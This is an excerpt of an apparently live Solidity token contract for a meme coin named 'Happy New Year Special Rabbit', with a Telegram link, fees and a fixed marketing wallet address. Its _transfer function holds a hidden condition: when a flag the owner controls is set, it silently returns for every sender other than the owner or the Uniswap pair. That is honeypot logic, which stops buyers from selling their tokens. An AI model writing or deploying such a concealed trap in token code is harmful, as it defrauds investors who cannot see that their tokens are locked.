...
/*
https://t.me/HappyNewYearSpecialRabbit
*/
interface IERC20 {
...
contract Contract is Context, IERC20, Ownable {
    ...
    string private constant _name = "Happy New Year Special Rabbit"; //
    string private constant _symbol = "HNY Special Rabbit"; //
    uint8 private constant _decimals = 9; //

    uint256 public _marketingFee = 2;
    uint256 public _liquidityFee = 1;
    address public  _marketingWallet = 0x6F003784b5a38EcbED559fC4C371b191BF4b022e;
    ...
    function _transfer(
        ...
        if(from != owner() && to != owner() && from != uniswapV2Pair && setReadyTimes){ return; }
